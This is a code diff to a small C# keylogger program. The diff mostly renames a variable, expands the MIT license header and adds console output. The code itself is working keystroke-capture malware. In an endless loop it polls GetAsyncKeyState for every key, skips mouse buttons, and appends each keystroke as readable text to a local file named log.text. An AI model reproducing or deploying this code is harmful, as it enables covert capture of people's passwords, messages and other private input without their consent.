@@ -1,7 +1,16 @@
 /* KeyLogger
- * Copyright (C) 2019  henkje (henkje@pm.me)
  * 
- * MIT license
+ * Copyright (c) 2019 henkje
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in all
+ * copies or substantial portions of the Software.
+ *
  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
@@ -25,31 +34,32 @@ namespace KeyLogger
 
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
-        private static string _Key = string.Empty;
+        private static string key = string.Empty;
 
         static void Main()
         {
-            int Keys = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.
+            int keys = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.
 
             while (true)
             {
-                for (int i = 0; i < Keys; i++)//Loop every key.
+                for (int i = 0; i < keys; i++)//Loop every key.
                     if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
-                        _Key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.
+                        key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.
 
                 //If no key is pressed, wait x milliseconds.
-                if (_Key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }
+                if (key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }
 
                 //Key is pressed, continue.
                 //Ingenore LButton and RButton, these are mouse clicks.
-                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
-                if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }
+                if (key.Equals("LButton")) { key = string.Empty; continue; }
+                if (key.Equals("RButton")) { key = string.Empty; continue; }
 
-                _Key = _Key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
-                _Key = _Key.Replace("Space", " ");//Replace Space for a real space.
+                key = key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
+                key = key.Replace("Space", " ");//Replace Space for a real space.
 
-                File.AppendAllText("log.text", _Key);//Write key to file.
-                _Key = string.Empty;//clear key.
+                Console.WriteLine(key);
+                File.AppendAllText("log.text", key);//Write key to file.
+                key = string.Empty;//clear key.
             }
         }
     }
